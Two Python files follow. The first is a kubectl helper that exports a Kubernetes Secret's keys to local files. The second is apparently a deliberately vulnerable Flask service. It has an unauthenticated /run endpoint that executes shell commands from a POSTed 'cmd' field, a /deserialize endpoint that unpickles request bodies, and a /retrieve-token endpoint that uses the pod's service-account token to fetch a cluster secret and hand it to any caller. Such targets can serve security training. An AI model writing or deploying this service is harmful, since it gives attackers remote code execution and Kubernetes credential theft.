#!/usr/bin/env python3
"""
Python script to read a given Kubernetes Secret and export all the keys present
in it into separate files, base64 decoding if necessary

Needs one command line argument, the secret name to read
"""

import base64
import pathlib
import os
import subprocess
import sys
import yaml


ROOT_DIR = 'decoded_secrets'


def write_secret(name, key, val):
    curr_secret_dir = os.path.join(ROOT_DIR, name)
    pathlib.Path(curr_secret_dir).mkdir(parents=True, exist_ok=True)

    filepath = os.path.join(curr_secret_dir, key)

    with open(filepath, 'w+b') as f:
        print(f'Writing Secret Key "{key}" To File: {filepath}')
        f.write(val)


def process_secret(name):
    print(f'Processing Secret named {name}')
    command = ['kubectl', 'get', 'secret', name, '-oyaml']
    process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout, stderr = process.communicate()
    stdout, stderr = stdout.decode(), stderr.decode()
    if process.poll() != 0:
        raise RuntimeError(stderr)

    secret = yaml.safe_load(stdout)

    if 'data' not in secret:
        raise KeyError('data')
    data = secret['data']
    for key, val in data.items():
        decoded_value = base64.b64decode(val)
        write_secret(name, key, decoded_value)


if __name__ == '__main__':
    if len(sys.argv) <= 1:
        raise RuntimeError('Need to pass the secret name to process!')
    secret_name = sys.argv[1]
    process_secret(secret_name)


##
##


from flask import Flask, request, jsonify
import os
import subprocess
import pickle
import requests

app = Flask(__name__)

# Health status endpoint
@app.route('/status', methods=['GET'])
def check_status():
    return jsonify({"status": "operational"})

# Command execution endpoint
@app.route('/run', methods=['POST'])
def run_command():
    cmd = request.form.get('cmd')
    if cmd:
        try:
            output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
            return output.decode('utf-8'), 200
        except subprocess.CalledProcessError as e:
            return str(e), 500
    return "No command specified", 400

# Data loading endpoint
@app.route('/deserialize', methods=['POST'])
def deserialize_data():
    payload = request.data
    try:
        obj = pickle.loads(payload)
        return jsonify(obj)
    except Exception as e:
        return str(e), 400

# Retrieve secret token endpoint
@app.route('/retrieve-token', methods=['GET'])
def retrieve_token():
    secret_identifier = 'master-token'
    ns = 'default'  # Change if needed
    endpoint = f'https://kubernetes.default.svc/api/v1/namespaces/{ns}/secrets/{secret_identifier}'
    
    # Authentication using service account token
    with open('/var/run/secrets/kubernetes.io/serviceaccount/token') as f:
        token = f.read().strip()
    
    headers = {'Authorization': f'Bearer {token}'}
    response = requests.get(endpoint, headers=headers, verify=False)  # Set verify=True if you have proper certs

    if response.status_code == 200:
        secret_info = response.json()
        token_value = secret_info['data']['MASTERPASS']
        return jsonify({"TOKEN": token_value})  # Token value is already a string
    else:
        return jsonify({"error": "Unable to fetch secret"}), response.status_code

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0')

##
##
